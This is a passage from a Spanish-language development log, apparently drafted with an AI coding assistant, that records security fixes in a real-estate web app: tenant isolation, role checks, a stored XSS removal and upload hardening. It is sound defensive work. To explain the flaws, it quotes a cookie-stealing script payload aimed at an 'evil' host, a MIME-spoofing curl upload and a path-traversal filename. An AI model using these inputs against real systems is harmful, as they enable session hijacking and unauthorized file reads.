- **`addRandomSuffix: false` en Vercel Blob**: por default, `put("foo.pdf")` guarda como `foo-<hash>.pdf` para evitar colisiones. Con `false`, guardás exactamente en el path que vos pasás → determinístico, podés calcular el path al leer sin storage adicional. Ideal para nuestro caso (path = scope/id/filename ya único por construcción).

### Preguntas para reflexionar

1. La elección de Vercel acepta lock-in moderado. La portabilidad real (cuántas horas tardaría migrar a otro host si Vercel sube precios o cambia política) es ~8-16 hs (sustituir adapter Blob, traducir vercel.json a equivalente del nuevo host, ajustar instrumentation). ¿Cuánto lock-in es "OK" para un proyecto de un solo dev? ¿Hay un threshold donde el costo de migración hipotética justifica preferir un host menos opinionated?

2. La storage adapter selecciona por env var (`BLOB_READ_WRITE_TOKEN`). Si alguien setea esa var por error en local, el dev se rompe sin warning claro. ¿Conviene loguear "Storage backend: local|blob" al startup? Trade-off: log noise vs operacional clarity.

3. La `docs/deploy-checklist.md` tiene 8 fases. Es prescriptive — pero quien la lea (vos, o un dev futuro) tiene que confiar en mí que el orden importa. ¿Vale la pena una segunda doc tipo "deploy mental model" que explica POR QUÉ cada fase está donde está, para que alguien pueda saltarse pasos con criterio? O es overkill — basta la prescripción.

4. SEC-7 incluye decisiones de host pero la decisión es reversible (cambiar de Vercel a Railway en 6 meses cuesta ~16 hs). Otras decisiones de SEC-3..6 son menos reversibles (cambiar de `additionalFields` a Postgres RLS implicaría rehacer las 86 routes). ¿Cómo se piensa la reversibilidad como criterio de decisión? ¿Algunas decisiones merecen más rigor que otras por eso?

### Qué debería anotar en Obsidian

- [ ] Concepto: Adapter pattern (interface + multiple implementations + selección runtime)
- [ ] Concepto: Vercel Cron Jobs vs `node-cron` — cuándo usar cuál
- [ ] Concepto: Fail-fast vs fail-silent en config de producción
- [ ] Concepto: HSTS y por qué `preload` requiere planning
- [ ] Concepto: Vercel free tier limits para apps de uso interno
- [ ] Patrón: storage adapter para hacer apps multi-host (filesystem + object storage)
- [ ] Patrón: `process.env.VERCEL` para detectar runtime
- [ ] Decisión técnica: SEC-7 — Vercel sobre Railway/VPS, criterios y trade-offs
- [ ] Decisión técnica: cron migration via vercel.json + endpoint HTTP existente
- [ ] Decisión técnica: fail-fast en sendEmail solo en producción (dev sigue como warning)
- [ ] Comando: `openssl rand -base64 32` para generar secrets
- [ ] Bug: `.env.example` ignorado por `.gitignore` con regla `.env*` — fix con `!.env.example`

---

## 2026-05-07 — SEC-6 (whitelist + private storage para uploads)

### Qué hice

Las 3 rutas que aceptan uploads (`tasks/[id]/archivos`, `contracts/[id]/documents`, `cash/movimientos/[id]/comprobante`) confiaban en `file.type` (header MIME del cliente, trivialmente falsificable) y guardaban los archivos en `public/uploads/...` — que Next.js sirve directamente con `Content-Type` inferido de la extensión. Un `agent` malicioso podía subir un `<script>...</script>.html` y, cuando otro user click-eaba el link, el browser lo renderizaba como HTML en el origen de la inmobiliaria → cookie theft, session hijack, todo lo que quisieras hacer con XSS same-origin.

Refactor completo en lugar de fix mínimo:

**1. Helper de validación** (`src/lib/uploads/validate.ts`) — ext whitelist (`pdf jpg jpeg png webp`) + verificación de magic bytes leídos del servidor (no `file.type`):
- PDF: `25 50 44 46` (`%PDF`)
- JPEG: `FF D8 FF`
- PNG: `89 50 4E 47 0D 0A 1A 0A`
- WebP: `52 49 46 46` en bytes 0-3 + `57 45 42 50` en bytes 8-11 (RIFF...WEBP, descarta AVI/WAV/otros RIFF)

Devuelve `{ ok: true, data: { ext, mime, buffer, size } }` con el MIME canónico de nuestra whitelist (no del cliente). Si el cliente miente y manda `application/pdf` con bytes de HTML, los magic bytes no matchean → 400.

**2. Helper de storage** (`src/lib/uploads/storage.ts`) — saveUpload/readUpload/deleteUpload contra `private-uploads/` (project root, gitignored). Path traversal protection en 3 capas:
- Regex: `^[A-Za-z0-9._-]+$` filename, `^[A-Za-z0-9_-]+$` para id (rechaza `..`, `/`, `\`)
- `path.resolve(ROOT, ...)` para normalización
- Prefix check: el path resuelto DEBE empezar con `path.resolve(ROOT, scope, id) + path.sep` (con el separador para evitar bypass por substring match)

`buildFileUrl(scope, id, filename)` genera `/api/files/<scope>/<id>/<filename>` (URL-encoded). Lo que se guarda en DB es esta URL, no la ruta del filesystem.

**3. Route protegida de servicio** (`src/app/api/files/[scope]/[id]/[filename]/route.ts`) — server route handler que:
- Valida sesión + agency con `requireAgencyId`
- Valida ownership: lookea la tabla del scope (tasks/contracts/movimientos) con `requireAgencyResource(table, id, agencyId)`. Si el recurso no es de mi agency → 404 indistinguible.
- Lee el archivo con `readUpload`
- Setea `Content-Type` desde nuestra whitelist (`EXT_TO_MIME[ext] ?? "application/octet-stream"`) — NUNCA confiamos en lo que mande la extensión del filesystem
- Headers de seguridad: `Content-Disposition: attachment` (fuerza descarga, no render inline) + `X-Content-Type-Options: nosniff` (bloquea MIME sniffing del browser) + `Cache-Control: private, no-store`

**4. Las 3 rutas de upload** dejaron de hacer escritura inline a `public/uploads/...`. Ahora:
1. `validateUpload(file, { allowedExts, maxBytes })` → si `!ok`, 400
2. Construir filename seguro (timestamp + sanitized para tasks/cash; UUID + ext para contracts)
3. `saveUpload(scope, id, filename, buffer)` → escribe en `private-uploads/<scope>/<id>/<filename>`
4. `buildFileUrl(scope, id, filename)` → `/api/files/<scope>/<id>/<filename>`
5. INSERT en DB con esa URL

Los DELETE/replace usan `parseFileUrl(stored_url)` + `deleteUpload(...)`. Si la URL es legacy (`/uploads/...`), parse devuelve null y skip silently — best-effort.

**5. Cron `cleanup-files.ts`** actualizado al mismo patrón (parse → deleteUpload).

**6. `.gitignore`** agrega `private-uploads/`.

**7. Comment outdated en `caja.ts:53`** corregido en commit aparte (referenciaba el path viejo).

### Por qué lo hice así y no de otra forma

**Por qué private-uploads + serving route en lugar de validation only**: la validación sola cierra el "subir `.html`" pero deja el resto del attack surface abierto:
- URLs en `/uploads/...` son accesibles a CUALQUIERA con la URL (sin auth check). Cross-tenancy filtrado por SEC-3 no aplica al filesystem. Si un agent comparte el link de un comprobante interno, cualquiera con la URL lo descarga.
- La extensión del archivo determina el `Content-Type` que el browser usa. Si mañana relajan la whitelist (ej: agregan `.svg`), el SVG es ejecutable como código en el browser y el XSS vuelve.
- En Vercel serverless, escribir a `public/` no funciona en runtime (filesystem read-only). Mover a `private-uploads/` no resuelve eso (mismo problema), pero la ARCHITECTURA queda alineada con S3/Vercel Blob para cuando se haga el deploy real (SEC-7).

Con private-uploads + serving route:
- Auth + agency check antes de cada read → respeta multi-tenancy en la capa de archivos también
- `Content-Type` lo controlamos nosotros (whitelist server-side, no extensión)
- `Content-Disposition: attachment` fuerza download, no render → defense-in-depth
- Path natural a S3: `saveUpload` se reemplaza por `s3.putObject`, `readUpload` por `s3.getObject`. Misma forma.

**Por qué magic bytes y no `file.type`**: el header `Content-Type` viene del cliente y se setea con un FormData browser-driven, pero nada impide a un atacante hacer `curl -F "file=@malicious.html;type=application/pdf"` y mandar bytes de HTML con header de PDF. Magic bytes los lee el server desde el buffer de bytes — son la única fuente confiable de "qué es este archivo realmente".

**Por qué `Content-Disposition: attachment` siempre, incluso para PDFs**: la alternativa (`inline`) deja al browser decidir si renderea o descarga. Para PDFs los browsers modernos rendean inline (PDF.js) — se ve bien para el user. PERO si un atacante pasa magic bytes de PDF en los primeros bytes y trash HTML después (PDF poliglot), algunos viewers tropiezan. `attachment` siempre = el archivo se descarga, el browser nunca lo procesa como ejecutable. El user pierde la previsualización inline pero gana seguridad. Tradeoff aceptable para una inmobiliaria — los uploads son evidencia de pagos, contratos, etc., que se descargan, no se "leen en el browser".

**Por qué `X-Content-Type-Options: nosniff`**: aunque seteamos `Content-Type: application/pdf`, IE y navegadores viejos podían "sniffear" el contenido y decidir que en realidad es HTML. `nosniff` les dice "respetá el Content-Type que mando, no adivines". Defense-in-depth.

**Por qué dejé `file.type` en el campo `tareaArchivo.type` del DB**: mirá, el campo es display metadata. Si el cliente manda mal MIME, el peor caso es que en el listado de archivos diga "image/jpeg" cuando es realmente PNG. Cosmético, no security. Pero para `comprobanteMime` en cash, sí lo cambié a `result.data.mime` (canonical) porque ese campo se usa downstream en algún reporte que decide cómo formatear.

**Por qué la regex de filename rechaza espacios y unicode**: la URL se construye con `encodeURIComponent` así que técnicamente no hay corrupción, pero el filesystem en Windows/macOS/Linux maneja unicode con sutilezas (NFD vs NFC). Restringir a ASCII alfanumérico + `._-` es portátil. El nombre original del archivo se preserva en el campo `name` de la DB (que sí permite unicode), entonces el user ve "Recibo de pago.pdf" en la UI aunque en disk se llama `1759823234-Recibo_de_pago.pdf`.

**Por qué single non-union ValidateResult en lugar de discriminated union**: tsconfig tiene `strict: false`. Con strict desactivado, TS no narrow-ea el `result.ok` para discriminar las dos branches del union. El call-site `if (!result.ok) return ...; result.data.buffer` falla con "Property 'data' does not exist on type". Workaround: forma plana `{ ok: boolean; data?; error?; status? }` y check defensivo `if (!result.ok || !result.data)`. Type safety ligeramente más débil pero compila. Si el proyecto activa `strict: true` en el futuro, swap fácil.

### Conceptos que aparecieron

- **Magic bytes / file signatures**: secuencias de bytes específicas al inicio (o cerca) de un archivo que identifican su formato real. PDFs siempre empiezan con `%PDF`, JPEGs con `FF D8 FF`. Es la única forma confiable de saber "qué es este archivo" — el cliente puede mentir sobre el `Content-Type`, pero los bytes son los bytes. La librería `file-type` de npm hace esto pero para 5 formatos custom es overkill — un switch es suficiente.

- **MIME sniffing**: heurística histórica de browsers (originalmente IE) que ignora el `Content-Type` y "adivina" el formato leyendo los primeros bytes de la respuesta. Pensado para "ayudar" cuando el server estaba mal configurado, pero abrió un vector de ataque: sirvo `Content-Type: text/plain` con HTML en el body, browser sniffea HTML, render. Solución: header `X-Content-Type-Options: nosniff` que le dice al browser "respetá lo que te mando".

- **`Content-Disposition: attachment` vs `inline`**: el header le dice al browser cómo manejar la respuesta. `inline` (default) = renderear en pestaña actual; `attachment` = descargar como archivo. Para uploads user-controlados, `attachment` es siempre la opción segura — saca al browser del rol de "intérprete de contenido".

- **Path traversal**: vector clásico donde un atacante manda `../../../etc/passwd` como filename y el server, ingenuamente, hace `fs.readFile("uploads/" + userInput)` → lee fuera de uploads/. Defensa: validar componentes del path (regex), normalizar con `path.resolve`, y verificar que el path resuelto está dentro del directorio esperado. Tres capas porque cada una sola tiene casos sutiles donde falla (encoding tricks, symlinks, prefix vs full match).

- **Defense-in-depth para uploads**: 4 capas:
  1. **Validate before save**: ext whitelist + magic bytes
  2. **Private storage**: archivos fuera de web root, no accesibles por URL directa
  3. **Auth + ownership check on read**: route handler valida cada serve
  4. **Safe headers on response**: `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`
  
  Si una capa se rompe (ej: bug en validación que deja pasar un .html), las otras te salvan. Atacante necesita romper LAS CUATRO para lograr un exploit real.

- **Vercel serverless filesystem**: en Vercel, el filesystem en runtime es read-only (excepto `/tmp`). `fs.writeFile("public/uploads/...")` falla. La fix arquitectural correcta es S3 / Vercel Blob — object storage externo. `private-uploads/` queda como step intermedio: en local funciona, en Vercel hay que swap por S3. La forma de los helpers `saveUpload/readUpload/deleteUpload` ya está, solo cambia la implementación interna.

- **Pollution vs deletion en file storage**: cuando reemplazás un upload (caso del comprobante de movimiento), el código viejo hacía `fs.unlink` y luego `fs.writeFile`. Si el unlink falla (race condition, file no existe), el writeFile sigue. Pero si el writeFile falla (disk full, perms), el unlink ya pasó → archivo viejo perdido sin reemplazo. Idiomatic: write first to temp filename, fsync, atomic rename. Para upload mvp esto es overkill, pero worth saberlo. Por ahora: best-effort en delete, atomic save no se hace.

### Preguntas para reflexionar

1. La regex `^[A-Za-z0-9._-]+$` para filenames es restrictiva — los users no pueden subir archivos con espacios, tildes, etc. en el filename. Pero el campo `name` en DB sí los preserva. ¿Es la restricción del filesystem name razonable, o vale la pena aceptar unicode? ¿Cuándo conviene complejidad vs portabilidad?

2. Los uploads ahora están en `private-uploads/` (filesystem). En Vercel hay que migrar a object storage. ¿Cuál es el momento correcto para hacer ese swap — antes del primer deploy a Vercel, o después de probar en self-hosted? ¿Vale la pena escribir un adapter abstraction ahora (`UploadStorage` interface con local + s3 implementations) o YAGNI hasta que duela?

3. La validación de magic bytes hardcodea los 5 formatos. Si mañana querés permitir `.docx`, hay que agregar la magic byte sequence (que para Office docs es no-trivial — son ZIPs con structure adentro). ¿Conviene seguir hardcodeando o usar la lib `file-type` (35+ formatos out of the box)? Tradeoff: dependencia nueva vs control granular.

4. El `Content-Disposition: attachment` siempre fuerza descarga. Para una imagen que el user quiere ver inline (preview en una task) se vuelve molesto — click → descarga → abrir manualmente. ¿Hay un patrón para "inline para imágenes verificadas, attachment para PDFs y otros"? ¿O el costo de UX vale lo que se gana en seguridad?

5. La regla "magic bytes server-side" es dura. Si el día de mañana querés validar un formato custom que no tiene magic bytes obvios (ej: CSV, JSON), el approach se rompe. ¿Cómo extendés la validation para esos casos sin abrir el vector de "cliente miente sobre el tipo"?

### Qué debería anotar en Obsidian

- [ ] Concepto: magic bytes / file signatures — qué son y por qué son la única fuente confiable de tipo
- [ ] Concepto: MIME sniffing y `X-Content-Type-Options: nosniff`
- [ ] Concepto: `Content-Disposition: attachment` vs `inline`
- [ ] Concepto: path traversal — vector y las 3 capas de defensa
- [ ] Concepto: defense-in-depth para uploads (4 capas)
- [ ] Patrón: validar uploads con whitelist de extensión + magic bytes (no `file.type`)
- [ ] Patrón: storage privado + serving route con auth check (no archivos en `public/`)
- [ ] Patrón: `saveUpload`/`readUpload`/`deleteUpload` como abstraction sobre filesystem (futuro adapter para S3)
- [ ] Decisión técnica: SEC-6 — refactor a private-storage vs validation only
- [ ] Bug: TS narrowing falla con `strict: false` en discriminated unions
- [ ] Comando: `path.resolve(ROOT) + path.sep` prefix check para evitar path traversal con substring match

---

## 2026-05-07 — SEC-5 (eliminar Stored XSS en documento de modificación de contrato)

### Qué hice

El endpoint `POST /api/contracts/[id]/amendments/[aid]/document` construía HTML interpolando `description`, `fieldsChanged.before/.after`, nombres de partes, etc. en template literals **sin escapar**, lo guardaba en `contract_amendment.documentContent` (text), y el `GET` lo servía con `Content-Type: text/html` desde el mismo origen. Un `agent` malicioso podía meter `<script>fetch('https://evil/?c='+document.cookie)</script>` en cualquier campo y robar la sesión de quien abriera el instrumento.

**Refactor (no fix mínimo)** — eliminé el vector entero en lugar de escapar interpolaciones:

1. **Nuevo componente JSX**: `src/components/contracts/amendment-document.tsx` — componente server-friendly que renderea el documento desde props. Todas las strings user-supplied pasan por JSX text nodes (`{description}`, `{ownerName}`, etc.), que React auto-escapa. Cero `dangerouslySetInnerHTML`.

2. **Nueva page route**: `src/app/(dashboard)/contratos/[id]/modificaciones/[aid]/page.tsx` — server component, fetchea contract + amendment + owner + tenant + agency directo desde DB (scoped por agencyId), computa `typeSeqNumber`, renderea `<AmendmentDocument {...props} />`. Si el helper `requireAgencyId` tira o el recurso no existe / es de otra agency, llama `notFound()` (404 indistinguible).

3. **POST simplificado**: dejó de generar HTML. Ahora solo valida + transiciona `status = "document_generated"`. La columna `documentContent` ya no se escribe.

4. **GET redirige** (307) al nuevo path, así bookmarks viejos siguen funcionando.

5. **UI actualizada**: el botón "Ver documento" en `contract-tab-amendments.tsx` apunta al nuevo page route.

6. **`hasDocument` flag** ahora se deriva de `status !== "registered"` (era `!!documentContent`). Sin esto, el botón "Ver documento" no aparecía para amendments nuevos post-SEC-5.

7. **Schema**: `documentContent` queda nullable, marcado como `// DEPRECATED post-SEC-5` en el comment.

8. **Cleanup de datos legacy**: corrí `UPDATE contract_amendment SET "documentContent" = NULL WHERE "documentContent" IS NOT NULL` contra la DB de dev. En esta DB devolvió 0 filas (no hay amendments todavía), pero la operación quedó ejecutada de forma idempotente. Esto neutraliza el suelo de datos: si en el futuro una feature lee la columna sin pensar, no encuentra HTML potencialmente malicioso. Para producción cuando llegue ahí: misma operación.

### Por qué lo hice así y no de otra forma

**Por qué refactor a JSX y no `escapeHtml()`**:
- `escapeHtml()` te obliga a recordar envolver TODA interpolación nueva. Cualquier desarrollador que mañana agregue un nuevo campo al `buildBody` y olvide el wrap, reintroduce el XSS. Anti-fragility cero.
- React auto-escapa por diseño. Es imposible olvidar — no existe la operación de "interpolar sin escapar" en JSX salvo que uses explícitamente `dangerouslySetInnerHTML` (cuyo nombre es la advertencia).
- Bonus que el usuario paga por una sola vez: los documentos siempre reflejan el estado actual del contrato. Antes, si cambiabas el nombre del propietario después de generar el documento, el HTML guardado quedaba con el nombre viejo.

**Por qué server component y no client**: el render server-side significa que React procesa los datos y emite HTML ya escapado. El browser recibe HTML estático seguro. No hay path de inyección client-side. Un client component que use React también auto-escapa, pero suma una API call innecesaria — el servidor ya tiene los datos.

**Por qué no borrar `documentContent` ya**: borrar la columna requiere migración destructiva. Las amendments legacy tienen ahí su HTML viejo (potencialmente con XSS). Mejor: dejarlas en la columna pero NUNCA servirlas más. El GET redirige al page route que renderea desde datos, ignorando `documentContent`. Los datos legacy quedan en el suelo, sin acceso. Cuando se confirme que nadie depende del campo (futura limpieza), se puede dropear con `ALTER TABLE`.

**Por qué cambiar `hasDocument` de `!!documentContent` a `status !== "registered"`**: post-SEC-5, `documentContent` es null para todos los amendments nuevos. Si `hasDocument` siguiera derivándose del campo deprecado, el botón "Ver documento" jamás aparecería para los amendments nuevos — UX rota. La fuente de verdad correcta post-refactor es el `status` (que es lo que el POST ahora transiciona). El campo `documentContent` queda como backwater de datos legacy, no como flag de control.

**Por qué el redirect 307 en GET y no 404 directo**: 307 preserva el método HTTP (importante para futuro proofing) y le da al browser la oportunidad de redirigir bookmarks viejos al nuevo path sin que el user note nada. Si en algún momento se confirma que nadie usa la URL `/api/...document`, se puede dropear el GET y dar 404 limpio.

### Conceptos que aparecieron

- **Stored XSS vs Reflected XSS**: SEC-5 era stored — la malicious payload queda en la DB, ejecuta cuando otro user la lee. Reflected es la que reflejas en una respuesta a una request del propio atacante. Stored es worse porque afecta a TERCEROS, no solo al que envió. La defensa es la misma (escapar / no almacenar HTML), pero el impact y la urgencia difieren.

- **Auto-escape como propiedad del framework**: el valor de React aquí no es performance ni hooks — es que `{value}` siempre escapa. La sintaxis no permite "interpolar como HTML" salvo que tipees explícitamente `dangerouslySetInnerHTML`. Comparado con string templates en JS donde `${x}` no escapa, React mueve la responsabilidad de seguridad del developer al framework.

- **`render on-demand` vs `store rendered`**: dos patrones para "mostrar contenido derivado". Almacenado es más rápido al servir (un SELECT) pero introduce stale data + el riesgo de que el contenido refleje un mundo viejo. On-demand es más cómputo por request pero garantiza freshness y, en este caso, elimina el ataque vector. El tradeoff es performance vs correctness — para documentos legales firmados, correctness gana.

- **`notFound()` de `next/navigation`**: equivalente al 404 helper de Express. Tira una excepción especial que Next.js cazza y convierte en 404. Útil para "no quiero discriminar entre 401/403/404" — todo lo que el atacante necesita saber es "esto no existe para vos".

- **`renderToString` y por qué NO lo usé**: `react-dom/server.renderToString` permite renderear React a HTML string desde un endpoint API. Lo descarté porque sumaría una dependencia a un endpoint API y mantendría el "store HTML" pattern. La page route en `(dashboard)/...` ya hace render-to-HTML server-side de forma idiomática para Next.js — no hay que reinventar.

- **Defense-in-depth in security architecture**: SEC-3 cierra inquilino isolation, SEC-4 cierra role isolation dentro del inquilino, SEC-5 cierra injection-via-stored-content. Cada uno cubre un eje distinto del threat model. El attacker tiene que pasar las 3 para hacer daño real.

### Preguntas para reflexionar

1. La regla "no almacenar HTML, rendear on-demand" es una de esas reglas que hubiera evitado el bug si se aplicaba desde el principio. ¿Por qué los developers eligen "almacenar HTML" en primer lugar? ¿Es por performance percibida, por costumbre de DOMContentLoaded fast paths, o por no querer pensar en el render context? Si entendiéramos el por qué, ¿cómo lo prevenimos en code review?

2. El `documentContent` legacy queda en la DB. Si mañana un atacante encuentra una vía indirecta para servir ese contenido (por ejemplo, una nueva feature que lee la columna sin pensar), el XSS vuelve. ¿Vale la pena hacer ya un `UPDATE contract_amendment SET documentContent = NULL` para neutralizar las amendments legacy? Cuál es el costo de retención vs el costo del riesgo?

3. La fix toca 5 archivos pero la lógica del documento está distribuida entre el componente, la page, y el endpoint POST. ¿Cómo se decide la "unidad de cambio mínima" en un refactor de seguridad? Si vendría a auditar en 6 meses, ¿qué archivos son obvios y cuáles requieren leer el LOG para entender por qué están así?

4. La regla "JSX text nodes son seguros" tiene una sola excepción: `dangerouslySetInnerHTML`. Pero hay otras formas de inyectar HTML en React — por ejemplo, `<a href={userValue}>` con un `javascript:` URL. ¿Qué otras "trampas" sutiles hay en React que podrían reintroducir XSS por descuido?

5. El GET endpoint quedó como redirect — un código de transición. ¿Cuándo conviene "remove and break" vs "redirect and migrate"? La redirección le da tiempo a los callers a moverse pero perpetúa el endpoint deprecado. ¿Hay alguna heurística clara?

### Qué debería anotar en Obsidian

- [ ] Concepto: Stored XSS vs Reflected XSS — qué los diferencia y por qué stored es peor
- [ ] Concepto: Auto-escape como propiedad del framework (React vs string templates)
- [ ] Concepto: Render on-demand vs store rendered — tradeoff de freshness vs performance
- [ ] Patrón: refactor de XSS — preferir eliminar el vector vs escapar interpolaciones
- [ ] Patrón: server components para documentos printable (XSS-immune por diseño)
- [ ] Patrón: deprecation de columna sin migración destructiva (deja datos, marca con comment, deja de leer)
- [ ] Decisión técnica: SEC-5 — JSX render-on-demand vs escapeHtml + CSP
- [ ] Decisión técnica: 307 redirect en endpoint deprecado vs 404 directo
- [ ] Bug: `hasDocument` derivado de `documentContent` rompió post-refactor (UX regression)
- [ ] Comando: `notFound()` de `next/navigation` para 404 indistinguible

---

## 2026-05-07 — SEC-4 (chequeo de rol en mutaciones)

### Qué hice

Audité los 71 archivos de routes con métodos POST/PATCH/PUT/DELETE buscando los que NO tenían chequeo de rol. Encontré 14 — de los cuales 2 son exempts por diseño (`register`, `register-oauth` anteceden a la sesión completa). Los 12 restantes recibieron checks tras `requireAgencyId(session)`.

**3 helpers nuevos en `src/lib/permissions.ts`**:
- `canManageCash(role)` → `agent | account_admin`
- `canManageFieldNotes(role)` → `agent | account_admin`
- `canManageAgency(role)` → **`account_admin` solamente** (más estricto que el resto)

**12 routes con check agregado**:

| Grupo | Files | Helper |
|---|---|---|
| Cash | 4 | `canManageCash` |
| Tasks | 3 | `canManageTasks` (existía) |
| Services comprobante | 1 | `canManageServices` (existía) |
| Field-notes | 2 | `canManageFieldNotes` |
| Zones POST | 1 | `canManageProperties` (zones son catálogo de propiedades) |
| Agency PATCH | 1 | `canManageAgency` |

El patrón aplicado uniformemente:

```ts
const session = await auth.api.getSession({ headers: await headers() });
const agencyId = requireAgencyId(session);          // SEC-3
if (!canManageX(session.user.role)) {               // SEC-4
  return NextResponse.json({ error: "No tienes permisos" }, { status: 403 });
}
```

### Por qué lo hice así y no de otra forma

**Por qué `canManageAgency` es `account_admin` solamente y no `agent + account_admin`**: editar la configuración de la inmobiliaria (datos fiscales, banking, preferencias de emisión) es una operación administrativa. Hoy no aplica (un user = un account_admin), pero cuando V2 agregue invitaciones de colaboradores con rol `agent`, los invitados NO deberían poder cambiar el CBU de la inmobiliaria ni los datos fiscales. Mejor cerrarlo desde ahora.

**Por qué `canManageProperties` para `zones POST` y no un `canManageZones` separado**: zones son etiquetas de barrios que se usan al crear/editar propiedades. Cualquiera que pueda crear propiedades necesita poder agregar zonas (`CreatableCombobox` permite crearlas inline). Crear un permiso separado `canManageZones` agregaría boilerplate sin lógica distintiva — dos arrays con el mismo contenido.

**Por qué `canManageFieldNotes` separado y no reutilizar `canManageProperties`**: las field notes son observaciones que un agente toma en visitas a propiedades. Conceptualmente "anotar una observación" es una operación distinta a "crear una propiedad". Si en V2 querés permitir que un rol más restringido (ej: futuro `inspector`) pueda agregar field notes pero no crear/editar propiedades, ya tenemos el split listo.

**Por qué reutilicé `canManageTasks`/`canManageServices` en vez de crear nuevos**: ya existían y son justo lo que necesitamos. Los routes faltaban el check pero el helper estaba.

**Por qué unifiqué el mensaje de error a `"No tienes permisos"`**: las routes de field-notes tenían `"Sin permiso"` inline. El resto del codebase usa `"No tienes permisos"`. Estandaricé al mensaje mayoritario para que el cliente UI tenga una sola string que matchear si quiere mostrar UX especial en 403.

**Por qué no inserté el check ANTES de `requireAgencyId`**: el orden es importante. `requireAgencyId` valida sesión + agency (401/403 según corresponda). Si lo dejabas para después del role check, un user sin agency vería un 403 "No tienes permisos" en vez del más correcto 403 "No has completado el registro de inmobiliaria". El orden actual da mensajes precisos.

### Conceptos que aparecieron

- **Defense-in-depth aplicado por capas**: SEC-3 garantiza que un usuario no vea recursos de otra agency (inquilino isolation). SEC-4 garantiza que un usuario read-only de su PROPIA agency no pueda mutarlos (role isolation). Las dos capas son ortogonales: un visitor con agencyId válido podía pasar SEC-3 (ve sus recursos) pero no SEC-4 (no los puede modificar).

- **Default permisivo vs default restrictivo**: las routes que pre-existían en SEC-3 sin checks de rol estaban funcionando con default permisivo — "todo logueado puede mutar". El audit cambió eso a default restrictivo — "todo logueado necesita un check explícito de rol para mutar". Cada route nueva en el futuro debe declararlo.

- **Audit pattern via grep**: la forma de detectar routes faltantes fue:
  ```bash
  for f in $(grep -lrE "^export async function (POST|PATCH|PUT|DELETE)" src/app/api); do
    grep -q "canManage\|canAnnulReceipts" "$f" || echo "$f"
  done
  ```
  Listó los 14 archivos sin check. Patrón reusable: cualquier convención que querés que sea uniforme se puede chequear así.

- **Granularidad de permisos**: tres niveles vimos hoy: (a) "todos los authenticated en la agency" (GETs), (b) "agent + account_admin" (mutaciones de negocio), (c) "account_admin solamente" (config admin). Más granular = más complejo de mantener. Menos granular = más leakage. La regla pragmática: empezar con un permiso por feature, granular solo cuando una distinción real aparece (V2 con invitaciones).

### Preguntas para reflexionar

1. El audit detectó 14 routes faltantes — pero la próxima route que agregues podría volver a olvidar el check. ¿Cómo lo prevenís? Una idea: lint rule custom que detecte `^export async function (POST|PATCH|PUT|DELETE)` sin un `canManage` cerca. ¿Vale el costo de mantenerla, o conviene un test que recorra `src/app/api` y falle si falta?

2. `canManageZones = canManageProperties` (mismo array). ¿Cuándo conviene un alias (ej: `canManageZones = canManageProperties`) y cuándo un permiso separado con el mismo contenido inicial? El alias es DRY pero acopla; el permiso separado es duplicación pero permite divergir sin refactor.

3. La unificación del mensaje (`"Sin permiso"` → `"No tienes permisos"`) es UX-visible. ¿Cuándo cambiar wording por consistencia es OK y cuándo es overreach? La regla "no romper UX" diría no tocar; la regla "consistencia" diría unificar. ¿Cómo lo balanceás?

4. `canManageAgency` admin-only no afecta hoy (un user = account_admin), pero anticipa V2. ¿Es esto YAGNI o legítima defense-in-depth? La diferencia: YAGNI es "agregar feature sin demanda real", defense-in-depth es "cerrar puerta antes de que alguien la abra". Acá la decisión fue cerrar puerta porque el costo es minúsculo (una línea).

### Qué debería anotar en Obsidian

- [ ] Concepto: defense-in-depth en autorización (tenant isolation + role isolation son ortogonales)
- [ ] Concepto: default permisivo vs default restrictivo en endpoints
- [ ] Patrón: audit grep para detectar routes que no siguen una convención
- [ ] Patrón: orden de validación en route handler (sesión → tenant → role → input)
- [ ] Decisión técnica: SEC-4 — qué helpers reutilizar vs crear nuevos
- [ ] Decisión técnica: granularidad de permisos (uno por feature vs aliases vs separados)

---

## 2026-05-06 — SEC-3 (multi-tenancy real con `agencyId`)

### Qué hice

Cerrado el bloqueante más grande de la auditoría pre-deploy. Antes de SEC-3, cualquier usuario logueado podía leer/editar/borrar datos de cualquier otra inmobiliaria — las rutas filtraban solo por `eq(table.id, id)` sin verificar a qué agency pertenecía el recurso.

El trabajo siguió el plan en 6 fases (`docs/superpowers/plans/2026-05-06-sec-3-multi-tenancy.md`):

**Fase 1 — Schema migration**: 14 tablas (`client`, `property`, `contract`, `cash_movement`, `task`, `service`, `guarantee`, `clauseTemplate`, `contract_amendment`, `contract_document`, `contract_participant`, `property_co_owner`, `property_room`, `tenant_ledger`) recibieron columna `agencyId NOT NULL` con FK a `agency.id ON DELETE CASCADE`. Migration SQL hand-written en `docs/migrations/sec-3-add-agency-id.sql` (versionado en git como trail de deploy). Backfill trivial: `(SELECT id FROM agency LIMIT 1)` porque hoy hay una sola agency real.

**Fase 2 — Sesión vía Better Auth `additionalFields`**: agregué `agencyId` al `additionalFields` config (mismo patrón que `role`), lo que hace que `session.user.agencyId` esté accesible en cada route handler sin queries extra. Backfill one-time del único user existente. Layout de `(dashboard)` simplificado: pasó de 2 queries (sesión + agency lookup) a 1.

**Fase 3 — Helpers obligatorios** (`src/lib/auth/agency.ts`):
- `requireAgencyId(session)` → tira 401 si no hay sesión, 403 si la sesión no tiene agency. Toda route lo llama primero.
- `requireAgencyResource(table, id, agencyId, [extraConditions])` → SELECT con doble filtro, devuelve 404 si no existe O pertenece a otra agency. **Mismo mensaje 404 en ambos casos** — no leak de existencia.
- 7 unit tests con `bun:test` para los helpers.

**Fase 4 — Cutover de 86 routes** en 8 commits agrupados por dominio (cash, clients/owners/tenants/guarantors/guarantees, properties, contracts, tasks, services, clauses+templates, dashboard+receipts+agency). Patrón uniforme: cada handler envuelto en `try { ... requireAgencyId ... } catch { handleAgencyError }`. Detail routes usan `requireAgencyResource` antes de cualquier mutation. Listings filtran por `eq(table.agencyId, agencyId)`. Inserts requieren `agencyId` por TS (la columna es NOT NULL en el tipo).

**Fase 5 — Validación cross-agency E2E** (`scripts/test-cross-agency.ts`): cree una Neon ephemeral branch, levanté `bun dev` apuntando a la branch, corrí un script que:
1. Crea 2 agencies fresh (sign-up + verify-email + register-oauth + insert client/property/contract) vía la API real
2. Hace HTTP calls bidireccionales — cookieA → agencyB.id → expect 404, cookieB → agencyA.id → expect 404
3. Verifica que listings de A no leakean IDs de B y viceversa
**32/32 asserciones pasan.** Branch borrada después.

**Fase 6 — Cierre**: build pasa limpio, lint pasa (95 problemas pre-existentes, ninguno en archivos SEC-3).

